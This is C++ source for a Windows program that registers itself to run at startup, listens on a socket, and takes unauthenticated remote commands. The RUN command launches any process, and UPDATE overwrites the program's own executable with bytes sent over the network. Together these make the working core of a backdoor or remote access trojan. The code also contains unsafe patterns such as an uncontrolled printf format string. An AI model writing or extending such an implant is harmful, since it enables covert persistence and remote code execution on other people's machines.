#include "winsockfuncs.h"
#include "autorun.h"
#define REG_NAME "server_final"
#define DEFAULT_PORT "8850"
#define DEFAULT_IP "127.0.0.1"
#define VERSION 0

#define DEFAULT_BUFLEN 1024
#define BIG_BUFLEN 65536



void pong(SOCKET);
void run(char*);
void update_exe(PCHAR,int);

int main(){
	try {
		char path[DEFAULT_BUFLEN];
		GetModuleFileNameA(NULL, path, DEFAULT_BUFLEN);
		autorunProj(REG_NAME, path);
		HANDLE tex = CreateMutexA(NULL, FALSE, "allow");
		DWORD state = WaitForSingleObject(tex, 0);
		if (state != WAIT_OBJECT_0) {
			throw("program already running\n");
		}
		SOCKET socket = connectServerSocket(DEFAULT_PORT);
		char recvmsg[BIG_BUFLEN];
		//-------------------------------------------------
		while (true) {
			strcpy_s(recvmsg,recvMessage(socket));
			printf("Client sent: %s\n", recvmsg);

			if (strcmp(recvmsg, "PING") == 0) {
				pong(socket);
			}
			else if (strcmp(recvmsg, "RUN") == 0) {
				//param stuff
				sendMessage("ENTER_PARAM", socket);
				strcpy_s(recvmsg, recvMessage(socket));
				printf("Client sent: %s\n", recvmsg);
				//
				run(recvmsg);
			}
			else if (strcmp(recvmsg, "PRNT") == 0) {
				//param stuff
				sendMessage("ENTER_PARAM", socket);
				strcpy_s(recvmsg, recvMessage(socket));
				printf("Client sent: %s\n", recvmsg);
				//
				printf("%s\n",recvmsg);
			}
			else if (strcmp(recvmsg, "UPDATE") == 0) {
				char* buff = recvMessage(socket, BIG_BUFLEN);
				int size;
				size = atoi(recvMessage(socket, DEFAULT_BUFLEN));
				update_exe(buff,size);
				sendMessage("update complete", socket);
			}
			else if (strcmp(recvmsg, "VERSION") == 0) {
				char sendmsg[DEFAULT_BUFLEN];
				sprintf_s(sendmsg, DEFAULT_BUFLEN, "%d", VERSION);
				sendMessage(sendmsg, socket);
			}
			else if (strcmp(recvmsg, "CLOSE") == 0) {
				break;
			}
			else {
				sendMessage("Illegal command", socket);
			}

		}
		printf("socket disconnected\n");
		system("pause");
		//------------------------------------------
		closeSocket(socket);
		ReleaseMutex(tex);
		CloseHandle(tex);
	}
	catch (const char* err) {
		printf(err);
		system("pause");
	}
}

void pong(SOCKET socket) {
	sendMessage("PONG", socket);
}

void run(char* path) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	INT size = strlen(path);
	CreateProcessA(
		NULL,
		path,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

void update_exe(char* data, int size) {
	//get path of exe
	PCHAR path = (PCHAR)malloc(DEFAULT_BUFLEN);
	GetModuleFileNameA(NULL, path, DEFAULT_BUFLEN);
	//create string path of old_path
	PCHAR old_path = (PCHAR)malloc(DEFAULT_BUFLEN);
	strcpy_s(old_path, DEFAULT_BUFLEN, path);
	old_path[strlen(old_path) - 4] = '\0';
	const char* help = "_temp.exe";
	strcat_s(old_path,DEFAULT_BUFLEN, help);
	//
	DeleteFileA(old_path);
	printf("delete error: %d\n", GetLastError());
	rename(path, old_path);
	HANDLE fout = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_WRITE|FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD fout_size;
	WriteFile(fout, data, size, &fout_size, NULL);
	CloseHandle(fout);
}